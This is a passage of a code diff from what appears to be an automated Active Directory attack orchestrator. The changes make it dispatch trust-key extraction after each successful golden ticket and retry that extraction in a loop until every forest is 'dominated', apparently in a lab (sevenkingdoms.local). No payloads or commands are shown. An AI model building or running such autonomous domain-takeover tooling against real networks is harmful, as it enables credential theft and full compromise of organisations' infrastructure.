+                                    # Update DC cache if Step 2
+                                    # resolved the parent DC
+                                    try:
+                                        if parent_dc_step2:
+                                            state.domain_controllers[parent_domain.lower()] = (
+                                                parent_dc_step2
+                                            )
+                                    except NameError:
+                                        pass  # Not set if escalation failed
+                                    await dispatcher._auto_dispatch_trust_key_extraction(
+                                        da_domain=parent_domain,
+                                        da_username="Administrator",
+                                        undominated_forests=state.get_undominated_forests(),
+                                        source_agent="auto_golden_ticket",
+                                    )
+                                except Exception as trust_err:
+                                    logger.warning(
+                                        f"🎫 Trust extraction dispatch failed: {trust_err}"
+                                    )
 
                         # Store ticket details in state (persisted to Redis!)
                         ticket_info = {
@@ -4053,6 +4537,34 @@ async def _auto_golden_ticket(
                                 "source": timeline_event.source,
                             }
                             await timeline_backend.add_timeline_event(event_dict)
+
+                        # Multi-forest mode: dispatch trust extraction after EVERY
+                        # successful golden ticket, not just from the ExtraSid path.
+                        # This ensures trust extraction fires for forest root domains
+                        # (e.g., sevenkingdoms.local) where ExtraSid doesn't apply,
+                        # and serves as a safety net if the ExtraSid path's dispatch
+                        # was skipped due to an exception in Step 1/2 processing.
+                        if get_multi_forest_mode() and not state.all_forests_dominated():
+                            _undom = state.get_undominated_forests()
+                            if _undom:
+                                # For child domains, dispatch from parent (forest root)
+                                # since trust accounts (e.g., ESSOS$) live there
+                                _dispatch_domain = domain
+                                _dparts = domain.lower().split(".")
+                                if len(_dparts) >= 3 and parent_domain:
+                                    _dispatch_domain = parent_domain
+                                try:
+                                    await dispatcher._auto_dispatch_trust_key_extraction(
+                                        da_domain=_dispatch_domain,
+                                        da_username="Administrator",
+                                        undominated_forests=_undom,
+                                        source_agent="auto_golden_ticket",
+                                    )
+                                except Exception as _te:
+                                    logger.warning(
+                                        f"🌲 Post-golden-ticket trust "
+                                        f"extraction dispatch failed: {_te}"
+                                    )
                     else:
                         logger.warning(
                             f"🎫 Auto-golden-ticket: Failed to generate ticket for {domain}: {output}"
@@ -4446,8 +4958,30 @@ async def _wait_for_completion(
             # Multi-forest mode: continue until ALL forests are dominated
             if get_multi_forest_mode() and not dispatcher.shared_state.all_forests_dominated():
                 # DA achieved but other forests remain - continue operation
-                # Don't break - just continue the loop to keep attacking
-                pass
+                # Periodically retry trust extraction dispatch as safety net
+                # (dedup in _auto_dispatch_trust_key_extraction prevents duplicates)
+                _undom = dispatcher.shared_state.get_undominated_forests()
+                if _undom:
+                    # Find the best forest root domain to dispatch from
+                    _da_doms = dispatcher.shared_state.domain_admin_domains
+                    _dispatch_from = None
+                    for _d in _da_doms:
+                        # Prefer forest root (2-part) over child (3+ part)
+                        if len(_d.split(".")) <= 2:
+                            _dispatch_from = _d
+                            break
+                    if not _dispatch_from and _da_doms:
+                        _dispatch_from = _da_doms[0]
+                    if _dispatch_from:
+                        try:
+                            await dispatcher._auto_dispatch_trust_key_extraction(
+                                da_domain=_dispatch_from,
+                                da_username="Administrator",
+                                undominated_forests=_undom,
+                                source_agent="completion_loop_safety_net",
+                            )
+                        except Exception:
+                            pass  # Dedup handles duplicates; errors logged inside
             else:
                 # Either not multi-forest mode, or all forests dominated
                 if get_multi_forest_mode():
